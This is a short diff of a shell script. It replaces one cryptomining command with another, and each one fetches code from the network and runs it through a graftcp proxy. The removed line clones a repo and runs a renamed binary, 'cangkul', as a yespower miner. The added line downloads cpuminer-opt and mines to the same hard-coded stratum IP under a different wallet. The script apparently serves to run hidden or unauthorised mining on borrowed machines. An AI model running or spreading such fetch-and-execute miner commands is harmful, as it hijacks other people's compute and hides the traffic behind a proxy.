@@ -36,4 +36,4 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp git clone https://github.com/Repopribadi27/sakti && cd sakti && chmod +x cangkul && ./cangkul -a yespower -o stratum+tcps://51.79.177.216:17017 -u web1qjqkdl9geqspau9hkq22pe6suu8ctj7c3q2ardc.deep -p x -t 10
+./graftcp/graftcp wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcps://51.79.177.216:17017 -u web1q7ls09p5rnrjy0s2pz4wpg9gyyqqmjweu936h6e.bor -t 10
